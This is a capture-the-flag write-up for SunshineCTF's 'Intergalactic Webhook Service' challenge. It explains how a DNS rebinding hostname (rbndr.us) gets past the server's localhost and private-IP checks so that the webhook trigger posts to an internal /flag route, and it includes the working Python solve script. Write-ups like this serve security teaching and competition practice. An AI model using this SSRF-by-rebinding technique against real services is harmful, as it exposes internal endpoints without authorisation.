## Name
Intergalactic Webhook Service 
### Problem Description
I got tired of creating webhooks from online sites, so I made my own webhook service! It even works in outer space! Be sure to check it out and let me know what you think. I'm sure it is the most secure webhook service in the universe.
### Solution
The solution to the challenge is a DNS rebinding attack.

The source code was provided, so I started looking through it. There are three main routes, the /register and /trigger routes and a /flag route which is hosted on a different port.

The /register route allows you to register a url. It will return a webhook id which can be used to trigger the webhook.
The /trigger route sends a post request to the registered url.

So you want to register a url which resolves to localhost, so that when the /trigger route is called, it will send a post request to the /flag route.

The problem is that the /register and /trigger routes are checking if the url would not resolve to localhost or is a private ip address.

So I need to find a way to bypass this check by using a url which would resolve to localhost or to a public ip address. 

I found a service on the internet https://lock.cmpxchg8b.com/rebinder.html which allows you to create a dns rebinding url. The url would resolve either to a public ip address or to localhost depending with a random probability.

The code I used to solve the challenge is as follows:

```python
import requests, time

BASE = "https://supernova.sunshinectf.games/"
RBNDR_HOST = "7f000001.a83f8110.rbndr.us"

while True:
    r = requests.post(BASE + "/register",
                      data={"url": f"http://{RBNDR_HOST}:5001/flag"})
    print("register:", r.status_code, r.text)
    if r.status_code == 200:
        wid = r.json()["id"]
        break
    time.sleep(0.5)

t = requests.post(BASE + "/trigger", data={"id": wid})
print("trigger:", t.text)
```